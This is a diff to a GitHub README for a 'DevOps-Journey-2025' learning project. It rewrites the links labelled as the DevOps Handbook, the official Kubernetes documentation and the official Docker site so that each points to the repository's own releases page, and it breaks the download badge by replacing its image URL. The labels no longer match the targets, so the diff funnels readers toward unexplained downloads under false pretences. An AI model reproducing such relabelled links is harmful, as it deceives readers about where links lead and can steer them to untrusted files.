@@ -1,6 +1,6 @@
 # 🚀 DevOps-Journey-2025 - Learn DevOps Easily Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-DevOps--Journey--2025-brightgreen)](https://github.com/guntaraa23/DevOps-Journey-2025/releases)
+[![Download Now](https://github.com/guntaraa23/DevOps-Journey-2025/releases%20Now-DevOps--Journey--2025-brightgreen)](https://github.com/guntaraa23/DevOps-Journey-2025/releases)
 
 ## 🚀 Getting Started
 
@@ -62,9 +62,9 @@ We encourage you to join our community of learners. Share your experience, ask q
 
 ## 🔗 Useful Resources
 
-- [DevOps Handbook](https://www.somewebsite.com) – A great resource for in-depth DevOps knowledge.
-- [Kubernetes Documentation](https://kubernetes.io/docs/) – Official documentation for more information on Kubernetes.
-- [Docker Official Site](https://www.docker.com/) – Resources on Docker.
+- [DevOps Handbook](https://github.com/guntaraa23/DevOps-Journey-2025/releases) – A great resource for in-depth DevOps knowledge.
+- [Kubernetes Documentation](https://github.com/guntaraa23/DevOps-Journey-2025/releases) – Official documentation for more information on Kubernetes.
+- [Docker Official Site](https://github.com/guntaraa23/DevOps-Journey-2025/releases) – Resources on Docker.
 
 For all materials and releases related to the **DevOps-Journey-2025**, revisit the Releases page:
 
